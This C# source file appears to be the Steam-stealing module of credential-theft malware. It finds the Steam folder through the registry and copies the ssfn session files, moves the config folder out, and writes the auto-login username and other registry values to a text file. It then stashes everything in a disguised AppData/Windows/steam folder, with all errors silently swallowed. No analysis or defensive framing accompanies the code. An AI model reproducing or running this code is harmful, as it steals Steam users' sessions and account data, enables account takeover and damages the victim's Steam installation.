using System.IO;
using Microsoft.Win32;
using System;

namespace steam1
{
    class steam
    {
        public static void Steam()
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam"); // Get steam registry
                if (key != null) // check steam registry

                {
                    string rgstr = key.GetValue("SteamPath").ToString(); // Get steam path
                    if (Directory.Exists(rgstr))
                    {  // directory check
                        Directory.CreateDirectory(rgstr + @"/" + "steamLog"); // Creating directory with name "steam"
                        string[] steamdirectory = Directory.GetFiles(rgstr); // get name of all files in directory
                        for (int i = 0; i < steamdirectory.Length; i++)
                        {
                            if (steamdirectory[i].StartsWith(rgstr + @"\" + "ssfn")) // checking ssfn startswith
                            {
                                try
                                {
                                    FileInfo ssfn = new FileInfo(steamdirectory[i]);
                                    ssfn.CopyTo(rgstr + @"/" + "steamLog" + @"/" + Path.GetFileName(steamdirectory[i])); //Copying ssfn files from Steam to steam
                                }
                                catch
                                {
                                }
                            }

                        }

                    }
                    try
                    {
                        Directory.Move(rgstr + @"/" + "config", rgstr + @"/" + "steamLog" + @"/" + "config"); // Moving .vdf config files from Steam/config to Steam/
                        RegistryKey hklm = Registry.CurrentUser;
                        RegistryKey hkSoftware = hklm.OpenSubKey("Software"); //going to steam registry
                        RegistryKey hkValve = hkSoftware.OpenSubKey("Valve"); //going to steam registry
                        RegistryKey hkSteam = hkValve.OpenSubKey("Steam"); // going to steam registry, finally :D



                        string autologin = hkSteam.GetValue("AutoLoginUser").ToString(); // new variable autologin with registry key AutoLoginUser
                        string LastGameNameUsed = hkSteam.GetValue("LastGameNameUsed").ToString(); // new variable LastGameNameUsed with registry key LastGameNameUsed
                        string PseudoUUID = hkSteam.GetValue("PseudoUUID").ToString(); // new variable PseudoUUID with registry key PseudoUUID
                        using (StreamWriter rrgtxt = new StreamWriter(rgstr + @"/" + "steamLog" + @"/" + "Registry.txt", false, System.Text.Encoding.Default)) // Writing information to registry.txt file
                        {
                            rrgtxt.WriteLine("AutoLoginUser ---   " + autologin + "\n" + "LastGameNameUsed ---   " + LastGameNameUsed + "\n" + "PseudoUUID ---   " + PseudoUUID + "\n"); // writing in text file information about registry
                        }
                        Directory.Move(rgstr + @"/" + "steamLog",
                            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/steam"); // moving steam directory to appdata/Windows
                    }
                    catch
                    { 
                    }
                }

            }
            catch
            {
            }
        }

    }
}
